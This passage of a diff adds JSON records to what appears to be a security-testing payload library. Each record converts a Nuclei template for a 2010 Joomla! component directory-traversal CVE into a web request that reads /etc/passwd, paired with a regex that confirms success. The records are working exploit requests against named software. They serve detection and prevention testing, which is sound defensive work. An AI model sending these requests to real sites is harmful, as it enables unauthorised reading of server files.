+    "payload_description": "[Nuclei CVE-2010-1219 by daffainfo] A directory traversal vulnerability in the JA News (com_janews) component 1.0 for Joomla! allows remote attackers to read arbitrary local files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_janews&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component DW Graph - Local File Inclusion (Nuclei: CVE-2010-1302)",
+    "payload_external_id": "B8-LFI-048",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1302 by daffainfo] A directory traversal vulnerability in dwgraphs.php in the DecryptWeb DW Graphs (com_dwgraphs) component 1.0 for Joomla! allows remote attackers to read arbitrary files via directory traversal sequences in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_dwgraphs&controller=../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component User Status - Local File Inclusion (Nuclei: CVE-2010-1304)",
+    "payload_external_id": "B8-LFI-049",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1304 by daffainfo] A directory traversal vulnerability in userstatus.php in the User Status (com_userstatus) component 1.21.16 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_userstatus&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component JInventory 1.23.02 - Local File Inclusion (Nuclei: CVE-2010-1305)",
+    "payload_external_id": "B8-LFI-050",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1305 by daffainfo] A directory traversal vulnerability in jinventory.php in the JInventory (com_jinventory) component 1.23.02 and possibly other versions before 1.26.03, a module for Joomla!, allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_jinventory&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Picasa 2.0 - Local File Inclusion (Nuclei: CVE-2010-1306)",
+    "payload_external_id": "B8-LFI-051",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1306 by daffainfo] A directory traversal vulnerability in the Picasa (com_joomlapicasa2) component 2.0 and 2.0.5 for Joomla! allows remote attackers to read arbitrary local files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_joomlapicasa2&controller=../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Magic Updater - Local File Inclusion (Nuclei: CVE-2010-1307)",
+    "payload_external_id": "B8-LFI-052",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1307 by daffainfo] A directory traversal vulnerability in the Magic Updater (com_joomlaupdater) component for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_joomlaupdater&controller=../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component SVMap 1.1.1 - Local File Inclusion (Nuclei: CVE-2010-1308)",
+    "payload_external_id": "B8-LFI-053",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1308 by daffainfo] A directory traversal vulnerability in the SVMap (com_svmap) component 1.1.1 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_svmap&controller=../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component News Portal 1.5.x - Local File Inclusion (Nuclei: CVE-2010-1312)",
+    "payload_external_id": "B8-LFI-054",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1312 by daffainfo] A directory traversal vulnerability in the iJoomla News Portal (com_news_portal) component 1.5.x for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_news_portal&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Saber Cart 1.0.0.12 - Local File Inclusion (Nuclei: CVE-2010-1313)",
+    "payload_external_id": "B8-LFI-055",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1313 by daffainfo] A directory traversal vulnerability in the Seber Cart (com_sebercart) component 1.0.0.12 and 1.0.0.13 for Joomla!, when magic_quotes_gpc is disabled, allows remote attackers to read arbitrary files via a .. (dot dot) in the view parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_sebercart&view=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Highslide 1.5 - Local File Inclusion (Nuclei: CVE-2010-1314)",
+    "payload_external_id": "B8-LFI-056",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1314 by daffainfo] A directory traversal vulnerability in the Highslide JS (com_hsconfig) component 1.5 and 2.0.9 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_hsconfig&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component webERPcustomer - Local File Inclusion (Nuclei: CVE-2010-1315)",
+    "payload_external_id": "B8-LFI-057",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1315 by daffainfo] A directory traversal vulnerability in weberpcustomer.php in the webERPcustomer (com_weberpcustomer) component 1.2.1 and 1.x before 1.06.02 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_weberpcustomer&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component com_jresearch - 'Controller' Local File Inclusion (Nuclei: CVE-2010-1340)",
+    "payload_external_id": "B8-LFI-058",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1340 by daffainfo] A directory traversal vulnerability in jresearch.php in the J!Research (com_jresearch) component for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_jresearch&controller=../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Cookex Agency CKForms - Local File Inclusion (Nuclei: CVE-2010-1345)",
+    "payload_external_id": "B8-LFI-059",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1345 by daffainfo] A directory traversal vulnerability in the Cookex Agency CKForms (com_ckforms) component 1.3.3 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_ckforms&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Juke Box 1.7 - Local File Inclusion (Nuclei: CVE-2010-1352)",
+    "payload_external_id": "B8-LFI-060",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1352 by daffainfo] A directory traversal vulnerability in the JOOFORGE Jutebox (com_jukebox) component 1.0 and 1.7 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_jukebox&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component LoginBox - Local File Inclusion (Nuclei: CVE-2010-1353)",
+    "payload_external_id": "B8-LFI-061",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1353 by daffainfo] A directory traversal vulnerability in the LoginBox Pro (com_loginbox) component for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the view parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_loginbox&view=../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component VJDEO 1.0 - Local File Inclusion (Nuclei: CVE-2010-1354)",
+    "payload_external_id": "B8-LFI-062",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1354 by daffainfo] A directory traversal vulnerability in the VJDEO (com_vjdeo) component 1.0 and 1.0.1 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_vjdeo&controller=../../../../../../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Photo Battle 1.0.1 - Local File Inclusion (Nuclei: CVE-2010-1461)",
+    "payload_external_id": "B8-LFI-063",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1461 by daffainfo] A directory traversal vulnerability in the Photo Battle (com_photobattle) component 1.0.1 for Joomla! allows remote attackers to read arbitrary files via the view parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_photobattle&view=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component JProject Manager 1.0 - Local File Inclusion (Nuclei: CVE-2010-1469)",
+    "payload_external_id": "B8-LFI-064",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1469 by daffainfo] A directory traversal vulnerability in the Ternaria Informatica JProject Manager (com_jprojectmanager) component 1.0 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impact via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_jprojectmanager&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Web TV 1.0 - Local File Inclusion (Nuclei: CVE-2010-1470)",
+    "payload_external_id": "B8-LFI-065",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1470 by daffainfo] A directory traversal vulnerability in the Web TV (com_webtv) component 1.0 for Joomla! allows remote attackers to read arbitrary files and have possibly other unspecified impacts via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_webtv&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Address Book 1.5.0 - Local File Inclusion (Nuclei: CVE-2010-1471)",
+    "payload_external_id": "B8-LFI-066",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1471 by daffainfo] A directory traversal vulnerability in the AddressBook (com_addressbook) component 1.5.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_addressbook&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Horoscope 1.5.0 - Local File Inclusion (Nuclei: CVE-2010-1472)",
+    "payload_external_id": "B8-LFI-067",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1472 by daffainfo] A directory traversal vulnerability in the Daily Horoscope (com_horoscope) component 1.5.0 for Joomla! allows remote attackers to read arbitrary files via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-high"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_horoscope&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Advertising 0.25 - Local File Inclusion (Nuclei: CVE-2010-1473)",
+    "payload_external_id": "B8-LFI-068",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1473 by daffainfo] A directory traversal vulnerability in the Advertising (com_advertising) component 0.25 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_advertising&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Sweetykeeper 1.5 - Local File Inclusion (Nuclei: CVE-2010-1474)",
+    "payload_external_id": "B8-LFI-069",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1474 by daffainfo] A directory traversal vulnerability in the Sweety Keeper (com_sweetykeeper) component 1.5.x for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
+    "payload_execution_arch": "ALL_ARCHITECTURES",
+    "payload_expectations": [
+      "PREVENTION",
+      "DETECTION"
+    ],
+    "payload_attack_patterns": [],
+    "payload_domains": [
+      {
+        "domain_id": "8144f32d-c2cf-43e0-a999-358628027817",
+        "domain_name": "To classify",
+        "domain_color": "#FFFFFF"
+      }
+    ],
+    "payload_tags": [
+      "b8",
+      "lfi",
+      "nuclei",
+      "sev-medium"
+    ],
+    "web_request_method": "GET",
+    "web_request_url": "/index.php?option=com_sweetykeeper&controller=../../../../../../../../../../etc/passwd%00",
+    "web_request_headers": [],
+    "web_request_body": "",
+    "web_request_body_type": "text",
+    "expected_status_codes": [
+      200
+    ],
+    "expected_body_regex": "root:.*:0:0:"
+  },
+  {
+    "payload_type": "WebAttack",
+    "payload_name": "Joomla! Component Preventive And Reservation 1.0.5 - Local File Inclusion (Nuclei: CVE-2010-1475)",
+    "payload_external_id": "B8-LFI-070",
+    "payload_source": "COMMUNITY",
+    "payload_status": "VERIFIED",
+    "payload_description": "[Nuclei CVE-2010-1475 by daffainfo] A directory traversal vulnerability in the Preventive & Reservation (com_preventive) component 1.0.5 for Joomla! allows remote attackers to read arbitrary files and possibly have unspecified other impacts via a .. (dot dot) in the controller parameter to index.php.",
+    "payload_platforms": [
+      "Generic"
+    ],
